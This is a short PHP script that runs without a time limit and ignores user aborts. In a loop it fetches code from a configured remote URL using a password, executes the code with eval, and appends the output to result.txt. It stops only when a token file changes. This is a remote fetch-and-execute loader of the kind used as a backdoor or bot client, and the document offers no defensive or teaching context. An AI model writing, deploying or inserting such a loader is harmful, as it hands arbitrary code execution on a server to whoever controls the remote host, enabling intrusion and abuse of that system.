<?php
include("config.php");
set_time_limit(0);
ignore_user_abort();
$token_run=md5(uniqid(rand(),true));
file_put_contents("token.txt",$token_run);
$token_file=$token_run;
while($token_run==$token_file){
	$text=file_get_contents($config["url"]."code.php?pwd=".$config["password"]);
	echo "Run ".date("H:i:s")."\r\n";
	echo $text."\r\n";
	ob_start();
	eval($text);
	$result=ob_get_contents();
	ob_end_clean();
	file_put_contents("result.txt",@file_get_contents("result.txt").$result);
	sleep($config["sleeptime"]);
	$token_file=@file_get_contents("token.txt");
}
?>